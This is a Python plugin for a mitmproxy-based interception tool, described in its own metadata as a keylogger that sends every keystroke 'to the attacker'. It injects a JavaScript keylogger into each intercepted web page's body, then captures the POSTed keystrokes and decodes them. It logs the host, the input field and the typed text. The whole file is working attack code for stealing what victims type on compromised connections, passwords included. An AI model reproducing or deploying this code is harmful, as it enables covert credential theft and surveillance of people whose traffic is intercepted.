from os import path
from mitmproxy.models import decoded
from plugins.extension.plugin import PluginTemplate

# Copyright (C) 2015-2016 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

class jskeylogger(PluginTemplate):
    meta = {
        'Name'      : 'jskeylogger',
        'Version'   : '1.0',
        'Description' : 'it stores all keystrokes along with a timestamps in a n array and send it to the attacker',
        'Author'    : '@byt3bl33d3r @xtr4nge'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = False
        self.filejs     = 'core/servers/proxy/http/scripts/msfkeylogger.js'
        if path.isfile(self.filejs):
            self.isfilePath = True
            self.content = open(self.filejs,'r').read()

    def request(self, flow):
        try:
            if flow.request.method == 'POST' and ('keylog' in flow.request.path):

                raw_keys = flow.request.content.split("&&")[0]
                input_field = flow.request.content.split("&&")[1]

                keys = raw_keys.split(",")
                if keys:
                    del keys[0]; del(keys[len(keys)-1])

                    nice = ''
                    for n in keys:
                        if n == '9':
                            nice += "<TAB>"
                        elif n == '8':
                            nice = nice[:-1]
                        elif n == '13':
                            nice = ''
                        else:
                            try:
                                nice += n.decode('hex')
                            except:
                                self.send_output.emit("["+self.Name+"] Error decoding char: {}".format(n))
                    self.send_output.emit("["+self.Name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))
        except Exception:
            pass
    def response(self, flow):
        if self.isfilePath:
            with decoded(flow.response):
                flow.response.content = flow.response.content.replace("</body>", "<script>" + self.content + "</script></body>")
                self.send_output.emit('[{}] javascript keylogger injected..'.format(self.Name))
            